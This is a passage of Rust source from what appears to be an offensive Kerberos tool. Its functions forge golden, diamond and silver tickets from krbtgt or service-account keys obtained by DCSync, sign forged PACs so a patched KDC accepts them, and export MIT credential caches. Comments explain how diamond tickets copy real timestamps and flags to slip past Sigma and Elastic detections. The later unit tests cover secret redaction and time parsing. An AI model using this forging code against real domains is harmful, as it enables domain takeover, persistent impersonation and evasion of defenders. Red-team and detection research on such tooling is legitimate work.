        crealm: realm,
    })
}

/// Forge a golden ticket: a TGT for an arbitrary identity, its EncTicketPart (with a forged PAC)
/// sealed under the domain's krbtgt AES256 key. The PAC's server *and* KDC signatures are both
/// computed with the krbtgt key, so a fully-patched (KB5020805) KDC accepts it. Returns a usable
/// [`Tgt`]; feed it to [`roast_spn`] for a live acceptance proof or [`golden_ccache`] to persist.
pub fn forge_golden_tgt(
    id: &crate::pac::ForgeIdentity,
    realm: &str,
    krbtgt_key: &[u8],
    rc4: bool,
) -> Result<Tgt> {
    let realm_up = realm.to_uppercase();
    forge_ticket(
        id,
        realm,
        krbtgt_key,
        krbtgt_key,
        krbtgt_key,
        &["krbtgt", &realm_up],
        rc4,
    )
}

/// **1.4.8-A WS-DIAMOND-TICKET**: forge a **Diamond ticket** — a TGT with an
/// attacker-chosen PAC (`id_overrides`) but timestamps + `cname` inherited from a
/// legitimately-obtained real TGT (`real`). The outer TGT looks like a normal
/// KDC-issued ticket (real auth/start/end/renew times matching wall-clock, real
/// principal), only the PAC's group memberships / SIDs are attacker-controlled.
///
/// Threat-hunting properties vs Golden:
/// - Golden: 10-year `endtime` + `renew_till` is a common Elastic / Sigma IOC.
/// - Diamond: timestamps match the KDC's real clock domain. Detection has to
///   go through the PAC's KDC signature or logon-event correlation — one
///   defense layer deeper.
///
/// Requires:
/// - `real`: a legitimately-obtained TGT (`get_tgt` / `asktgt` under any account).
/// - `krbtgt_key`: the domain's krbtgt AES256 key (from a prior DCSync).
/// - `id_overrides`: attacker-chosen PAC.
///
/// Feed the returned `Tgt` to [`golden_ccache`] to persist as an MIT ccache.
pub fn forge_diamond_tgt(
    real: &Tgt,
    id_overrides: &crate::pac::ForgeIdentity,
    krbtgt_key: &[u8],
    rc4: bool,
) -> Result<Tgt> {
    let (etp, _pac_bytes) = crate::pac::decrypt_ticket_pac(real, krbtgt_key)
        .context("decrypt real TGT ticket with krbtgt key")?;
    // 1.5.3 boundary: kerbcore etp → picky-typed public `TicketTimestamps`.
    let ts = TicketTimestamps {
        auth_time: Some(picky_krb_time(&etp.authtime)?),
        starttime: etp.starttime.as_deref().map(picky_krb_time).transpose()?,
        endtime: Some(picky_krb_time(&etp.endtime)?),
        renew_till: etp.renew_till.as_deref().map(picky_krb_time).transpose()?,
        // 1.5.3 audit H-3: inherit the real ticket's `TicketFlags` — the outer flag word is
        // exactly the detection discriminator "abnormal-flags-for-this-user" alerts hook.
        // Without this, Diamond overrode with the Golden default 0x40e10000, defeating the
        // whole point of the ticket type. ms-pac-forge's own diamond does this too (`etp.flags`).
        flags: Some(etp.flags),
        // 1.4.8 audit fix: inherit outer cname from the template. Without
        // this, roast_spn / any client-side AP-REQ builds the authenticator
        // with `Tgt.cname` = attacker-chosen and the ticket enc-part carries
        // attacker-chosen too, but downstream ccache tools that mismatch
        // header-vs-ticket cname get BADMATCH. Real Diamond ticket = outer
        // cname is the template's (looks like a normal login for that user),
        // PAC internally carries the attacker's group memberships.
        cname_template: Some(picky_cname(&etp.cname)?),
    };
    let realm_up = real.crealm.to_uppercase();
    forge_ticket_with_timestamps(
        id_overrides,
        &real.crealm,
        krbtgt_key,
        krbtgt_key,
        krbtgt_key,
        &["krbtgt", &realm_up],
        rc4,
        &ts,
    )
}

/// Forge a silver ticket: a service ticket (TGS) for `spn`, sealed + PAC-signed under the target
/// **service account's** AES256 key (from `dcsync <machine$/svc>`). Used directly against the
/// service (AP-REQ) without contacting the KDC — so the KDC signature is unchecked; both PAC
/// signatures use the service key. Returns the forged service ticket as a [`Tgt`] wrapper
/// (`.ticket`/session key); persist with [`silver_ccache`].
pub fn forge_silver_tgt(
    id: &crate::pac::ForgeIdentity,
    realm: &str,
    service_key: &[u8],
    spn: &str,
    rc4: bool,
) -> Result<Tgt> {
    let comps: Vec<&str> = spn.split('/').collect();
    forge_ticket(
        id,
        realm,
        service_key,
        service_key,
        service_key,
        &comps,
        rc4,
    )
}

/// Serialize a forged [`Tgt`] to an MIT credential cache (usable with `KRB5CCNAME` / `-k` tools).
pub fn golden_ccache(tgt: &Tgt, user: &str) -> Result<Vec<u8>> {
    ccache_for(tgt, user, &["krbtgt", &tgt.crealm.clone()])
}

/// Serialize a forged silver ticket to a ccache (server principal = the SPN).
pub fn silver_ccache(tgt: &Tgt, user: &str, spn: &str) -> Result<Vec<u8>> {
    let comps: Vec<&str> = spn.split('/').collect();
    ccache_for(tgt, user, &comps)
}

fn ccache_for(tgt: &Tgt, user: &str, server: &[&str]) -> Result<Vec<u8>> {
    use crate::pkinit::{cvec, write_principal};
    let realm = &tgt.crealm;
    let mut c = Vec::new();
    c.extend_from_slice(&[0x05, 0x04]); // version 0x0504
    let header = [0x00u8, 0x01, 0x00, 0x08, 0, 0, 0, 0, 0, 0, 0, 0];
    c.extend_from_slice(&(header.len() as u16).to_be_bytes());
    c.extend_from_slice(&header);

    write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[user]); // default principal
    write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[user]); // client
    write_principal(&mut c, NT_SRV_INST as u32, realm, server); // server

    // keyblock: keytype (from the tracked session_etype — 1.5.3 audit H-1/M-5), etype(0),
    // keylen, key. Using the wire etype ensures AES128 sessions are ccache-typed 17, not 23.
    c.extend_from_slice(&(tgt.session_etype as u16).to_be_bytes());
    c.extend_from_slice(&0u16.to_be_bytes());
    c.extend_from_slice(&(tgt.session_key.len() as u16).to_be_bytes());
    c.extend_from_slice(&tgt.session_key);

    // times: authtime, starttime, endtime, renew_till — 0/now-ish is fine for a forged cred.
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as u32)
        .unwrap_or(0);
    let far = now.saturating_add(10 * 365 * 24 * 3600);
    for t in [now, now, far, far] {
        c.extend_from_slice(&t.to_be_bytes());
    }
    c.push(0); // is_skey = false
    c.extend_from_slice(&0x50e10000u32.to_be_bytes()); // tktflags (forwardable|renewable|initial|preauth)
    c.extend_from_slice(&0u32.to_be_bytes()); // num_address
    c.extend_from_slice(&0u32.to_be_bytes()); // num_authdata

    let ticket_der =
        picky_asn1_der::to_vec(&tgt.ticket).map_err(|e| anyhow!("encode ticket: {e}"))?;
    cvec(&mut c, &ticket_der);
    cvec(&mut c, &[]); // empty second ticket
    Ok(c)
}

// WS-REDACT-TICKET (1.4.7): defensive Debug impls on Tgt + ServiceTicket redact the session
// key + ticket ciphertext. `PkinitTgt` already wraps its secrets in `Redacted<T>` — this
// closes the same gap on the non-PKINIT ticket types so the WS-INT-VVV auto-trace can't
// leak session-key bytes if a future refactor embeds a Tgt in a `#[derive(Debug)]` struct.
#[cfg(test)]
mod ws_redact_ticket_tests {
    use super::{
        encrypted_data, krb_string, principal, PrincipalName, ServiceTicket, Tgt, Ticket,
        NT_SRV_INST,
    };
    use picky_asn1::wrapper::{
        ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2, ExplicitContextTag3,
        IntegerAsn1,
    };
    use picky_krb::data_types::TicketInner;

    /// Build a stand-in Ticket + Tgt/ServiceTicket for redaction testing. The session_key
    /// carries a distinctive sentinel byte pattern so we can assert it never surfaces in
    /// `{:?}` output.
    fn sentinel_ticket() -> Ticket {
        Ticket::from(TicketInner {
            tkt_vno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
            realm: ExplicitContextTag1::from(krb_string("TESTLAB.LOCAL").unwrap()),
            sname: ExplicitContextTag2::from(
                principal(NT_SRV_INST, &["krbtgt", "TESTLAB.LOCAL"]).unwrap(),
            ),
            // ticket ciphertext carries a distinctive sentinel pattern the test also checks for.
            enc_part: ExplicitContextTag3::from(encrypted_data(
                18,
                b"CIPHERSENTINEL_MUST_NOT_LEAK".to_vec(),
            )),
        })
    }

    fn sentinel_cname() -> PrincipalName {
        principal(1 /* NT_PRINCIPAL */, &["alice"]).unwrap()
    }

    /// The session-key sentinel: distinctive 32 bytes we can grep the format output for.
    const SESSION_KEY_SENTINEL: &[u8] = b"SESSIONKEY_SENTINEL_MUST_NOT_LEAK";

    #[test]
    fn tgt_debug_redacts_session_key_and_ticket() {
        let tgt = Tgt {
            ticket: sentinel_ticket(),
            session_key: SESSION_KEY_SENTINEL.to_vec(),
            session_etype: 18,
            cname: sentinel_cname(),
            crealm: "TESTLAB.LOCAL".to_string(),
        };
        let dbg = format!("{tgt:?}");
        // Non-secret fields survive (readability).
        assert!(
            dbg.contains("TESTLAB.LOCAL"),
            "crealm should appear, got: {dbg}"
        );
        // Secret bytes must NOT appear — under WS-INT-VVV, interactive sessions run at
        // trace level, and a stray `{tgt:?}` anywhere upstream would otherwise leak these.
        assert!(
            !dbg.contains("SESSIONKEY_SENTINEL_MUST_NOT_LEAK"),
            "session_key bytes must be redacted, got: {dbg}"
        );
        assert!(
            !dbg.contains("CIPHERSENTINEL_MUST_NOT_LEAK"),
            "ticket ciphertext must be redacted, got: {dbg}"
        );
        // Positive assertion: the redaction placeholder is present.
        assert!(
            dbg.contains("\"***\""),
            "Debug output must show redaction placeholder, got: {dbg}"
        );
    }

    #[test]
    fn service_ticket_debug_redacts_session_key_and_ticket() {
        let st = ServiceTicket {
            ticket: sentinel_ticket(),
            session_key: SESSION_KEY_SENTINEL.to_vec(),
            session_etype: 18,
            crealm: "TESTLAB.LOCAL".to_string(),
            cname: sentinel_cname(),
            spn: vec!["HTTP".to_string(), "webapp01".to_string()],
        };
        let dbg = format!("{st:?}");
        assert!(dbg.contains("TESTLAB.LOCAL"));
        assert!(
            dbg.contains("HTTP"),
            "SPN parts should appear (non-secret): {dbg}"
        );
        assert!(
            !dbg.contains("SESSIONKEY_SENTINEL_MUST_NOT_LEAK"),
            "session_key bytes must be redacted, got: {dbg}"
        );
        assert!(
            !dbg.contains("CIPHERSENTINEL_MUST_NOT_LEAK"),
            "ticket ciphertext must be redacted, got: {dbg}"
        );
        assert!(dbg.contains("\"***\""));
    }

    #[test]
    fn tgt_embedded_in_derived_debug_struct_stays_redacted() {
        // The realistic failure mode WS-INT-VVV creates: someone puts a Tgt in a struct that
        // #[derive(Debug)]s. Verify the redaction still holds via the standard #[derive] path.
        #[derive(Debug)]
        #[allow(dead_code)]
        struct SomeContext {
            note: &'static str,
            tgt: Tgt,
        }
        let ctx = SomeContext {
            note: "carrying a tgt around",
            tgt: Tgt {
                ticket: sentinel_ticket(),
                session_key: SESSION_KEY_SENTINEL.to_vec(),
                session_etype: 18,
                cname: sentinel_cname(),
                crealm: "TESTLAB.LOCAL".to_string(),
            },
        };
        let dbg = format!("{ctx:?}");
        assert!(dbg.contains("carrying a tgt around"));
        assert!(
            !dbg.contains("SESSIONKEY_SENTINEL_MUST_NOT_LEAK"),
            "embedding a Tgt in a #[derive(Debug)] struct must not leak secrets, got: {dbg}"
        );
    }
}

#[cfg(test)]
mod aes_key_tests {
    use picky_krb::crypto::CipherSuite;

    /// Regression anchor for the AES256 string-to-key that DCSync-extracted Kerberos keys are
    /// cross-checked against (the same `aes256-cts-hmac-sha1-96` derivation used to authenticate,
    /// which the live integration tests prove correct against a real KDC). Here we pin its output
    /// for a fixed synthetic input — no lab data — so a change in the crypto wiring is caught:
    /// the key must be 32 bytes, deterministic, and salt-sensitive.
    #[test]
    fn aes256_string_to_key_stable() {
        let derive = |pw: &[u8], salt: &[u8]| {
            CipherSuite::Aes256CtsHmacSha196
                .cipher()
                .generate_key_from_password(pw, salt)
                .unwrap()
        };
        let k = derive(b"password", b"CORP.LOCALalice");
        assert_eq!(k.len(), 32);
        assert_eq!(k, derive(b"password", b"CORP.LOCALalice")); // deterministic
        assert_ne!(k, derive(b"password", b"CORP.LOCALbob")); // salt-sensitive
        assert_ne!(k, derive(b"different", b"CORP.LOCALalice")); // password-sensitive
    }
}

/// Round-trip tests for the 1.5.3 kerbcore-Phase-1 boundary shims that keep
/// `TicketTimestamps` publicly picky-typed while the forger internals run on kerbcore
/// (see `picky_krb_time`, `kc_krb_time_str`, `kc_cname`). Deleted at K9 with the shims.
#[cfg(test)]
mod picky_bridge_tests {
    use super::*;

    #[test]
    fn krb_time_far_future_round_trip() {
        // The forger uses this exact constant for ticket endtime / renew_till defaults.
        let s = FAR_FUTURE;
        let pt = picky_krb_time(s).expect("FAR_FUTURE parses");
        assert_eq!(
            kc_krb_time_str(&pt),
            s,
            "FAR_FUTURE must round-trip byte-identical"
        );
    }

    #[test]
    fn krb_time_kdc_shape_round_trip() {
        // A KDC-shaped generalized time: 2026-09-28 14:32:11 UTC.
        let s = "20260928143211Z";
        let pt = picky_krb_time(s).unwrap();
        assert_eq!(kc_krb_time_str(&pt), s);
        // Component check to prove parse is right, not just symmetric.
        assert_eq!(pt.0.year(), 2026);
        assert_eq!(pt.0.month(), 9);
        assert_eq!(pt.0.day(), 28);
        assert_eq!(pt.0.hour(), 14);
        assert_eq!(pt.0.minute(), 32);
        assert_eq!(pt.0.second(), 11);
    }

    #[test]
    fn krb_time_now_shape_round_trip() {
        // The forger also derives `auth_time` from `now_krb_str()`, so its actual
        // wire format has to be the one `picky_krb_time` accepts.
        let s = now_krb_str();
        let pt = picky_krb_time(&s).expect("now_krb_str must be parseable");
        assert_eq!(kc_krb_time_str(&pt), s);
    }

    #[test]
    fn krb_time_rejects_malformed() {
        // Frame/format validation. Calendar-plausibility validation is left to picky_asn1's
        // `Date::new`, which turns out to be lax (accepts Feb 30) — not exercised here.
        // kerbcore never emits calendar-invalid dates when parsing a KDC DER response, so a
        // stricter shim would over-fit; frame-shape correctness is what matters at the boundary.
        assert!(picky_krb_time("").is_err(), "empty");
        assert!(picky_krb_time("20260928143211").is_err(), "missing Z");
        assert!(picky_krb_time("20260928143211z").is_err(), "lowercase z");
        assert!(picky_krb_time("20260928143211ZZ").is_err(), "too long");
        assert!(picky_krb_time("2026092814321Z").is_err(), "too short by 1");
        assert!(
            picky_krb_time("2026XX28143211Z").is_err(),
            "non-digit month"
        );
    }

    #[test]
    fn cname_bridge_round_trip_srv_inst() {
        // Two-component SRV_INST (`cifs/host.corp.local`) — the shape S4U / RBCD chain
        // funnels through the shim on the READ side (`forge_ticket_with_timestamps`).
        let kc = kerbcore::types::PrincipalName {
            name_type: kerbcore::client::NT_SRV_INST,
            name_string: vec!["cifs".to_string(), "host.corp.local".to_string()],
        };
        let picky = picky_cname(&kc).expect("kerbcore -> picky");
        let back = kc_cname(&picky).expect("picky -> kerbcore");
        assert_eq!(back.name_type, kc.name_type);
        assert_eq!(back.name_string, kc.name_string);
        // Byte-identical DER: the strongest correctness signal.
        assert_eq!(back.encode(), kc.encode(), "byte-identical DER round-trip");
    }

    #[test]
    fn cname_bridge_round_trip_principal() {
        // Single-component NT_PRINCIPAL (`Administrator`) — the Golden/Silver default.
        let kc = kerbcore::types::PrincipalName {
            name_type: kerbcore::client::NT_PRINCIPAL,
            name_string: vec!["Administrator".to_string()],
        };
        let picky = picky_cname(&kc).unwrap();
        let back = kc_cname(&picky).unwrap();
        assert_eq!(back.encode(), kc.encode());
    }
}
